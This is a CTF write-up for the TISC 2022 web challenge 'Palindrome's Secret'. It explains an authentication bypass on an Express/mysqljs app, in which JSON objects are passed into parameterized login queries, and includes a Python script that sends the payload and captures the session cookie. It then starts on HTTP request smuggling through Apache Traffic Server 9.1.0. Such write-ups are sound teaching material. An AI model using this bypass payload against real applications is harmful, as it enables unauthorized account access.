---
title: "TISC 2022 Web Palindrome's Secret"
date: 2022-09-12T00:05:00+08:00
draft: true
tags:
    - ctf
    - tisc-2022
    - web
    - nodejs
    - express
    - mysql
    - traffic-server
    - proxy
    - sqli
    - http-request-smuggling
    - dangling-markup-injection
    - html-injection
categories:
    - ctf
    - writeup
    - tisc-2022
---

## Palindrome's Secret Challenge Description
This was a Web challenge unlocked at level 5 that was part of the recent [TISC 2022](https://www.csit.gov.sg/events/tisc/tisc-2022) CTF organised by [CSIT](https://www.csit.gov.sg/). TISC 2022 was an individual CTF that is level-based and not exactly a typical jeopardy-style CTF, meaning that only 1 challenge is released at a time and only after you solve that 1 challenge do you unlock the next one. In this writeup, I will discuss my approach towards solving this particular web challenge.

## Introduction
Palindrome's Secret was an interesting web challenge that had 3 parts to it, an SQL Injection through parameterized queries, [HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling) and finally a [Dangling Markup Injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup). IMO, the HTTP Request Smuggling exploit was the most interesting hack that I learned through this CTF and definitely worth a writeup.

## Studying the Web Application & Source Code
If we analyzed the `docker-compose.yml` file for the web application, we would notice that there are 4 services in total.

```docker
version: "3"
services:
  app:
    build: ./app
    privileged: true
    restart: always
    environment:
      - MYSQL_PASSWORD=REDACTED                   # NOT THE REAL PASSWORD
      - ADMIN_TOKEN=TISC{0:1:2:3:4:5:6:6:8:9}     # NOT THE REAL FLAG
      - EMAIL=REDACTED@REDACTED                   # NOT THE REAL EMAIL
      - PASSWORD=REDACTED                         # NOT THE REAL PASSWORD
      - BASE_URL=http://localhost:8000

  proxy:
    build: ./proxy
    restart: always
    ports:
      - 80:8080

  db:
    image: mysql
    restart: always
    environment:
      - MYSQL_ROOT_PASSWORD=REDACTED              # NOT THE REAL PASSWORD
      - MYSQL_DATABASE=palindrome
    volumes:
      - ./mysql-init:/docker-entrypoint-initdb.d
    
  redis:
    image: redis
    restart: always

```

Right of the bat I noticed 3 key pieces of information:
- There is a `mysql` database that's exposed as the `db` service
- Only the `proxy` service is exposed publicly
- The flag is stored in an environment variable in the `app` service as `ADMIN_TOKEN`

Playing around with the web application, I realised that there was no way I could navigate to any other resources and I always got redirected to the login service. This is where I started to suspect an SQL Injection as the first step to this challenge.

The `db` service had nothing interesting so I started of by studying the application's `main.js` source code and its routes:

```javascript
const mysql = require('mysql')

const express = require('express')
const session = require('express-session')

//** Omitted **//

const db = mysql.createConnection({
    host     : 'db',
    user     : 'web',
    password : process.env.MYSQL_PASSWORD,
    database : 'palindrome'
});

//** Omitted **//

const app = express()
const port = 8000
```

So, we have an `express` application running on port 8000 that uses `mysql` as the backend database (as we saw earlier from the `docker-compose.yml` file).

```javascript
// Application Routes
app.get     ('/login', getLoginHandler)
app.post    ('/login', postLoginHandler)

app.get     ('/index', authenticationMiddleware, indexHandler)
app.get     ('/token', authenticationMiddleware, getTokenHandler)
app.post    ('/token', authenticationMiddleware, postTokenHandler)
app.get     ('/verify', authenticationMiddleware, tokenVerifyHandler)
app.get     ('/report-issue', authenticationMiddleware, reportIssueHandler)
app.post    ('/do-report', authenticationMiddleware, doReportHandler)
app.all     ('/forbidden', authenticationMiddleware, forbiddenHandler)
```

More importantly, based on the above routing information, our theories are confirmed, that no matter which endpoint is passed in, the `authenticationMiddleware` would always be processed first. So let's take a look at what `authenticationMiddleware` does:

```javascript
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN 

        next()
    }
    else 
        return res.redirect('/login')
}
```

Ahhh, it seems like we have 2 very key pieces of information here:
- If `req.session.userId` is not set, the application redirects the user to the `/login` endpoint.
- If the `req.ip` is `127.0.0.1`, the `req.session.token` is set to the `ADMIN_TOKEN`, which as we saw earlier, is the flag.

Let's ignore the second part for now and focus on how to set a `req.session.userId`. If we did a search on the `main.js`, we would realise that the only other place `req.session.userId` is mentioned is in the `postLoginHandler`, so lets take a look at that:

```javascript
const postLoginHandler = async (req, res) => {
    const { email, password } = req.body
    if (!email || !password)
        return res.status(400).send({ message: 'Missing email or password' })

    const rows = await query(`SELECT * FROM users WHERE email = ? AND password = ?`, [email, password])
    if (rows.length === 0)
        return res.status(401).send({ message: 'Invalid email or password' })

    req.session.userId = rows[0].id
    return res.status(200).send({ message: "Success" })
}
```
## SQL Injection through Query Parameterization

Hmmm, based on the previous section it seems like we have [Query Parameterization](https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html), which should TECHNICALLY protect us from SQLi, or does it?

I did a bit of digging around and eventually came across [an article](https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4) that was referenced from [this article](https://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/), which describes the exact scenario we are facing, an `express` application that does parameterized queries. 

In short, the article describes that "due to certain specifications in `express`, one can pass in to the parameters a different value type like an `Object`, `Boolean` or an `Array`".

To elaborate further, this means that we can pass in an `Object` like a JSON object instead of the expected `String` into the `username` or `password` field. In other words, instead of:

```bash
{
    "email":"email@email.com",
    "password":"password""
}
```

We can instead pass in a javascript object to of the fields and `express` would interpret it as a valid SQL statement.

```bash
{
    "email":{"email":1},
    "password":{"password":1}
}
```

On `mysql`'s side, the SQL statement would be interpreted like this:

```sql
SELECT * FROM users WHERE email = `email` = 1 AND password = `password` = 1;
```
and because ``email = `email` `` and ``password = `password` `` both evaluates to `1`, which evaluates to the following:

```sql
SELECT * FROM users WHERE 1 = 1 AND 1 = 1;
```

and finally, `mysql` evaluates the following:

```sql
SELECT * FROM users;
```

Notice that in the `postLoginHandler` code a `401` is returned only if the number of rows returned by `mysql` is 0:

```javascript
if (rows.length === 0)
    return res.status(401).send({ message: 'Invalid email or password' })

req.session.userId = rows[0].id
return res.status(200).send({ message: "Success" })
```

Thankfully enough, there is only one user that is registered in the database as seen in in `mysql-init/init.sql` file:

```sql
INSERT INTO `users` (`email`, `password`) VALUES ("REDACTED@REDACTED", "REDACTED");
```
Here's a script that I used to authenticate and print a cookie that can be used for the other parts of this challenge:

```python
import requests
import json

url = "http://chal010yo0os7fxmu2rhdrybsdiwsdqxgjdfuh.ctf.sg:23627"
body = {"email": {"email":1},
        "password": {"password":1}
        }
login_url = f"{url}/login"
r = requests.post(login_url, json=body)

for c in r.cookies:
    if c.name == "connect.sid":
        print(c.name, c.value)
```

I ran the script to get a cookie:

```bash
└─$ python3 login.py
connect.sid s%3AZtg1Ilaj_1kRPexPD2nopZUCN0SF_GIF.ESM4lx5LkmWvf57fvccsa%2Bh8ADOVPGLGZO1Sh4YMidg
```

I put it in the browser and success, I have bypassed the authentication system and can successfully navigate to other parts of the web application!

![Login-Bypass](/images/posts/tisc-2022-level5-login-bypass.PNG)

## HTTP Request Smuggling

Let's go back and take a look at our `authenticationMiddleware` again:

```javascript
const authenticationMiddleware = async (req, res, next) => {
    if (req.session.userId) {
        if (req.ip === '127.0.0.1')
            req.session.token = process.env.ADMIN_TOKEN 

        next()
    }
    else 
        return res.redirect('/login')
}
```

It seems like in order to set the `req.session.token` as the FLAG, we would have to make a request from `127.0.0.1`. The first thing that stood out to me was the `POST /do-report` endpoint, which when you attempt to make a request to it externally, it returns a `403 forbidden`.

I guess it's time to take a deeper look at the `proxy` service itself! Let's first inspect the proxy software being used from the `Dockerfile` itself:

```docker
FROM ubuntu:20.04
RUN apt-get update && DEBIAN_FRONTEND=noninteractive apt-get upgrade -y
RUN DEBIAN_FRONTEND=noninteractive apt-get install -y curl build-essential libssl-dev libpcre3-dev zlib1g-dev
WORKDIR /ats
RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.tar.bz2 > ats.tar.bz2 && \
    tar xf ats.tar.bz2 && \
    cd trafficserver-9.1.0 && \
    ./configure --prefix=/opt/ts && \
    make && \
    make install

COPY remap.config /opt/ts/etc/trafficserver/remap.config
RUN chmod +r /opt/ts/etc/trafficserver/remap.config

CMD ["/opt/ts/bin/traffic_manager"]
```

Alright, it seems like we're using Apache Traffic Server 9.1.0 as the proxying software and googling around I eventually came across this [CVE](https://lists.apache.org/thread/rc64lwbdgrkv674koc3zl1sljr9vwg21) for it (which turns out to be similar to [SEETF 2022's](https://ctftime.org/event/1543) flagportal revenge challenge).

Either way, let's inspect the `remap.config` configuration file for it:

```config
map             /login          http://app:8000/login
map             /index          http://app:8000/index
map             /token          http://app:8000/token
map             /verify         http://app:8000/verify
map             /report-issue   http://app:8000/report-issue
map             /static         http://app:8000/static
map             /do-report      http://app:8000/forbidden
regex_redirect  http://(.*)/    http://$1/index
```

Indeed, as we can see from the config file any requests to `do-report` gets redirected to `/forbidden`. 